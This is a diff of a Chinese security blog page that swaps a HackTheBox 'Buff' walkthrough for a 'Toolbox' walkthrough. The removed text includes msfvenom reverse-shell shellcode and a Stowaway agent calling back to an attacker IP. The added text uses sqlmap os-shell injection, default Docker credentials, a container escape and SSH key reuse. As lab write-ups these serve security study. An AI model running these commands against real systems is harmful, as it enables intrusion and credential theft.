@@ -16,16 +16,16 @@
   <meta name="author" content="FYHypo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 端口扫描    0x02 web    优先尝试命令执行    看起来是一个文件上传的getshell，用id参数访问触发   12powershell -c &quot;gci -r -file c:\users&quot;powershell -c &quot;gc C:\users\shaun\Desktop\user.txt&quot;  0x03 加固 开smb拿nc把she">
+    <meta name="description" content="0x01 端口扫描   443web、21ftp匿名访问、22ssh(win7)443证书暴露了域信息：admin.megalogistic.com  12echo &quot;10.129.96.171 admin.megalogistic.com&quot; &gt;&gt; &#x2F;etc&#x2F;hoststail -n 1 &#x2F;etc&#x2F;hosts   0x02 ftp 匿名登录后只有一个docker-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB Buff">
-<meta property="og:url" content="https://fyhypo.github.io/2024/08/31/Buff/index.html">
+<meta property="og:title" content="Toolbox">
+<meta property="og:url" content="https://fyhypo.github.io/2024/08/31/Toolbox/index.html">
 <meta property="og:site_name" content="FYHypo&#39;s blog">
-<meta property="og:description" content="0x01 端口扫描    0x02 web    优先尝试命令执行    看起来是一个文件上传的getshell，用id参数访问触发   12powershell -c &quot;gci -r -file c:\users&quot;powershell -c &quot;gc C:\users\shaun\Desktop\user.txt&quot;  0x03 加固 开smb拿nc把she">
+<meta property="og:description" content="0x01 端口扫描   443web、21ftp匿名访问、22ssh(win7)443证书暴露了域信息：admin.megalogistic.com  12echo &quot;10.129.96.171 admin.megalogistic.com&quot; &gt;&gt; &#x2F;etc&#x2F;hoststail -n 1 &#x2F;etc&#x2F;hosts   0x02 ftp 匿名登录后只有一个docker-">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fyhypo.github.io/img/Billub0x.jpg">
-<meta property="article:published_time" content="2024-08-31T05:29:18.301Z">
-<meta property="article:modified_time" content="2024-08-31T05:50:16.655Z">
+<meta property="article:published_time" content="2024-08-31T06:28:34.435Z">
+<meta property="article:modified_time" content="2024-08-31T06:35:08.074Z">
 <meta property="article:author" content="FYHypo">
 <meta property="article:tag" content="pentest">
 <meta name="twitter:card" content="summary_large_image">
@@ -33,7 +33,7 @@
   
   
   
-  <title>HTB Buff - FYHypo&#39;s blog</title>
+  <title>Toolbox - FYHypo&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HTB Buff"></span>
+            <span id="subtitle" data-typed-text="Toolbox"></span>
           
         </div>
 
@@ -226,7 +226,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-08-31 13:29" pubdate>
+        <time datetime="2024-08-31 14:28" pubdate>
           2024年8月31日 下午
         </time>
       </span>
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          180 字
+          366 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -286,68 +286,92 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">HTB Buff</h1>
+            <h1 id="seo-header">Toolbox</h1>
             
             
               <div class="markdown-body">
                 
-                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134222.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134721.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134804.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134911.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135404.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135044.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135329.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135456.png" srcset="/img/loading.gif" lazyload></p>
+                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114235.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114326.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816114731.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>优先尝试命令执行</p>
+<p>443web、21ftp匿名访问、22ssh(win7)<br>443证书暴露了域信息：admin.megalogistic.com</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135651.png" srcset="/img/loading.gif" lazyload></p>
-<blockquote>
-<p>看起来是一个文件上传的getshell，用id参数访问触发</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135832.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -c <span class="hljs-string">&quot;gci -r -file c:\users&quot;</span><br>powershell -c <span class="hljs-string">&quot;gc C:\users\shaun\Desktop\user.txt&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.96.171 admin.megalogistic.com&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure>
 
-<h2 id="0x03-加固"><a href="#0x03-加固" class="headerlink" title="0x03 加固"></a>0x03 加固</h2><blockquote>
-<p>开smb拿nc把shell反弹出来</p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115123.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><blockquote>
+<p>匿名登录后只有一个<code>docker-toolbox.exe</code></p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818143452.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115554.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>上线stowaway</p>
+<p>对该exe的研究暂时延后</p>
 </blockquote>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">start</span> <span class="hljs-string">&quot;&quot;</span> stow-agent-x64.exe -c <span class="hljs-number">10.10.16.8:5566</span> -s <span class="hljs-number">123456</span> --cs gbk --reconnect <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -N -L //10.129.96.171<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152156.png" srcset="/img/loading.gif" lazyload></p>
-<blockquote>
-<p>至此站稳了脚步</p>
-</blockquote>
-<h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p>查询.net版本：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\<span class="hljs-built_in">NET</span> Framework Setup\NDP\v4\Full&quot; /v Release<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115743.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x04-web"><a href="#0x04-web" class="headerlink" title="0x04 web"></a>0x04 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816115421.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816120417.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#强制https</span><br>sqlmap -r sql.txt --force-ssl<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152454.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816120708.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816121117.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816121130.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>版本为4.8，放心用winpeas</p>
+<p>admin@iamzeadmin</p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">start</span> &quot;&quot; <span class="hljs-built_in">cmd</span> /C &quot;winpeas-x64.exe log&quot;<br></code></pre></td></tr></table></figure>
+<p>本身也能万能密码进后台，所以用处不大，尝试写马：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-cmd <span class="hljs-built_in">id</span> --flush-session --batch<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818161022.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>发现了denfender</p>
+<p>写马过程最好交给–batch，自己一个没选对就要报错：<code>unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported </code></p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162757.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816122451.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>奇怪的开在本地的进程，刚刚gci扫目录好像也看到了它的执行文件</p>
+<p>可以通，且判断为linux，显然是在docker中，换os-shell反弹shell</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162913.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171538.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171915.png" srcset="/img/loading.gif" lazyload></p>
-<blockquote>
-<p>原poc执行的是calc.exe，用msfvenom生成反弹shell的shellcode替换</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -b <span class="hljs-string">&#x27;\x00\x0A\x0D&#x27;</span> -f python -v payload<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r sql.txt --force-ssl --os-shell --batch<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105831.png" srcset="/img/loading.gif" lazyload><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105838.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816122800.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <br><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816124322.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816141235.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>经典的docker ip，宿主机大概率就是172.17.0.2，传fscan探测：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h 172.17.0.1 -o 1.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816142100.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816154146.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>web页面和入口点的一样，唯一突破点在ssh</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816155751.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>似乎存在默认凭据，去官网查看</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816155821.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>确实是，docker@tcuser<br>本来是让正常用户的windows主机去使用管理toolbox的，但是这里能被我们的docker机访问到</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816160007.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>至此移动到了toolbox宿主机，还需要进一步移动到真正的windows宿主机，到了docker逃逸环节，上cdk：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./cdk eva --full<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816165418.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>看到了挂载了的<code>c:\users\administrator</code>下面有ssh的公私钥，验证后下载下来直接连接</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -e -f id_rsa<br>ssh-keygen -y -e -f id_rsa.pub<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>ssh-keygen -y -e -f &lt;file&gt;</code> 将返回密钥的公钥，因此可以使用它来检查私钥是否与公钥匹配</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816172743.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240816170034.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -372,8 +396,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HTB Buff</div>
-      <div>https://fyhypo.github.io/2024/08/31/Buff/</div>
+      <div>Toolbox</div>
+      <div>https://fyhypo.github.io/2024/08/31/Toolbox/</div>
     </div>
     <div class="license-meta">
       
@@ -417,18 +441,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/08/31/Toolbox/" title="Toolbox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Toolbox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/08/31/Driver/" title="HTB Driver">
-                        <span class="hidden-mobile">HTB Driver</span>
+                      <a href="/2024/08/31/Buff/" title="HTB Buff">
+                        <span class="hidden-mobile">HTB Buff</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
